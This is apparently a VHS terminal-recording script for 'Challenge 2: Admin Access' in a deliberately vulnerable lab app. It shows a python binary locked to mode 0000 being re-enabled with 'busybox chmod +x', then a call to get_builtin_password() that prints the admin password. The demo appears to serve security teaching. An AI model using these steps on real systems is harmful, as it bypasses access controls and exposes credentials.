# Challenge 2: Admin Access
# The admin password is "encrypted" with a key mounted right next to it,
# and python3 is deliberately locked to mode 0000 - but appuser owns the
# file, and busybox ships its own chmod applet.
Output demos/gifs/02-admin-access.gif

Set Shell "bash"
Set FontSize 18
Set Width 1200
Set Height 650
Set Padding 20
Set WindowBar Colorful
Set TypingSpeed 35ms

Type `docker compose exec app python3 -c "print(1)"`
Enter
Sleep 2s

Type `docker compose exec app sh -c "busybox chmod +x /usr/local/bin/python3.11"`
Enter
Sleep 1.5s

Type `docker compose exec app python3 -c "from app.services.auth import get_builtin_password; print(get_builtin_password())"`
Enter
Sleep 2.5s
